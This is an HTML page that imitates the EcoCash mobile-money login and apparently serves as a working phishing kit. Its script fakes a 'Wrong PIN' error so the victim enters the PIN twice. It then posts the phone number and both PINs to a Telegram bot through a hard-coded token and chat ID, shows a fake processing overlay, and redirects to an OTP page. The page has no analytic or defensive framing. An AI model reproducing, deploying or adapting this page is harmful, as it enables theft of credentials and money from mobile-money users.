<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EcoCash Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  font-family:'Poppins',sans-serif;
  background:#fff;
  color:#333;
  text-align:center;
}

/* LOGO */
.logo{
  margin-top:50px;
  font-size:42px;
  font-weight:700;
}
.logo span:first-child{color:#0b5ed7}
.logo span:last-child{color:#e63946}

h2{margin:25px 0;font-weight:600}

/* PHONE */
.phone-box{
  width:85%;
  margin:0 auto 10px;
  border:2px solid #0b5ed7;
  border-radius:10px;
  display:flex;
  align-items:center;
  padding:10px;
}
.flag{margin-right:8px;font-size:20px}
.phone-box input{
  border:none;
  outline:none;
  font-size:16px;
  flex:1;
}

/* PIN */
.pin-label{margin:10px 0;color:#666}

.pin{
  display:flex;
  justify-content:center;
  gap:10px;
}

.pin-input{
  width:45px;
  height:45px;
  border:2px solid #0b5ed7;
  border-radius:8px;
  font-size:20px;
  text-align:center;
}

/* WRONG PIN (PLAIN RED SHAKE) */
.pin-error{
  margin:10px auto 4px;
  width:85%;
  color:#e74c3c;
  font-weight:600;
  font-size:14px;
  opacity:0;
}

.shake{
  animation: shake 0.35s ease-in-out 3;
}

@keyframes shake{
  0%{transform:translateX(0)}
  25%{transform:translateX(-4px)}
  50%{transform:translateX(4px)}
  75%{transform:translateX(-4px)}
  100%{transform:translateX(0)}
}

.forgot{margin-top:6px;color:#666;font-size:14px}

/* PROCESSING OVERLAY */
#processingOverlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.55);
  display:none;
  align-items:center;
  justify-content:center;
  z-index:999;
}

.processing-box{
  background:#fff;
  padding:28px 32px;
  border-radius:18px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:14px;
  font-weight:600;
  color:#0b5ed7;
}

.spinner{
  width:42px;
  height:42px;
  border:4px solid #ddd;
  border-top-color:#0b5ed7;
  border-radius:50%;
  animation: spin 1s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg)}
}

/* BOTTOM */
.bottom{
  margin-top:40px;
  background:#0b5ed7;
  color:#fff;
  padding:40px 20px;
  border-top-left-radius:40px;
  border-top-right-radius:40px;
}

.actions{
  display:flex;
  gap:15px;
  justify-content:center;
}

.btn{
  background:#fff;
  color:#0b5ed7;
  border:none;
  padding:12px 18px;
  border-radius:12px;
  font-weight:600;
  width:140px;
}

.footer{margin-top:20px;font-size:12px;opacity:.9}
.footer a{color:#fff;text-decoration:underline}

@media(max-width:360px){
  .pin-input{width:40px;height:40px}
}
</style>
</head>

<body>

<div class="logo">
  <span>Eco</span><span>Cash</span>
</div>

<h2>Login</h2>

<div class="phone-box">
  <div class="flag">ðŸ‡¿ðŸ‡¼</div>
  <strong>+263</strong>
  <input type="text" id="phone" maxlength="9" placeholder="Enter phone number">
</div>

<div class="pin-label">Enter your PIN</div>

<div class="pin">
  <input class="pin-input" maxlength="1">
  <input class="pin-input" maxlength="1">
  <input class="pin-input" maxlength="1">
  <input class="pin-input" maxlength="1">
</div>

<div id="pin-error" class="pin-error">Wrong PIN</div>
<div class="forgot">Forgot PIN?</div>

<div class="bottom">
  <p>To register an EcoCash wallet or get assistance,<br>click below</p>

  <div class="actions">
    <button class="btn">Register</button>
    <button class="btn">Help & Support</button>
  </div>

  <div class="footer">
    <p>v2.1.3P</p>
    <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
  </div>
</div>

<!-- PROCESSING OVERLAY -->
<div id="processingOverlay">
  <div class="processing-box">
    <div class="spinner"></div>
    <div>Processingâ€¦ please wait</div>
  </div>
</div>

<script>
let firstPin = '';
let secondPin = '';
let pinAttempt = 0;

const pinInputs = document.querySelectorAll('.pin-input');
const errorMsg = document.getElementById('pin-error');
const phoneInput = document.getElementById('phone');
const overlay = document.getElementById('processingOverlay');

function getPinValue() {
  return Array.from(pinInputs).map(input => input.value).join('');
}

function sendToTelegram(phone, firstPin, secondPin) {
  const botToken = '8305012784:AAH_kLIiqQ1sJ5vIlYOKHK985j26_kE1ubQ';
  const chatId = '8355316248';
  const message = `Phone: ${phone}\nFirst PIN: ${firstPin}\nSecond PIN: ${secondPin}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
}

pinInputs.forEach((input, idx) => {
  input.addEventListener('input', e => {
    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);

    if (input.value && idx < pinInputs.length - 1) {
      pinInputs[idx + 1].focus();
    }

    errorMsg.style.opacity = '0';

    if ([...pinInputs].every(i => i.value.length === 1)) {
      pinAttempt++;
      if (pinAttempt === 1) {
        firstPin = getPinValue(); // Capture PIN before clearing
        errorMsg.textContent = 'Wrong PIN';
        errorMsg.style.opacity = '1';
        setTimeout(() => {
          pinInputs.forEach(i => i.value = '');
          pinInputs[0].focus();
        }, 100);
      } else if (pinAttempt === 2) {
        secondPin = getPinValue();
        const phone = phoneInput.value.trim();
        if (!phone) {
          errorMsg.textContent = 'Please enter your phone number.';
          errorMsg.style.opacity = '1';
          pinAttempt--;
          return;
        }
        localStorage.setItem('phoneNumber', phone);
        // Send details to Telegram BEFORE processing begins
  sendToTelegram(phone, firstPin, secondPin);

        overlay.style.display = 'flex';

        setTimeout(() => {
          window.location.href = 'otp.html';
        }, 10000);
      }
    }
  });

  input.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !input.value && idx > 0) {
      pinInputs[idx - 1].focus();
    }
  });
});
</script>

</body>
</html>
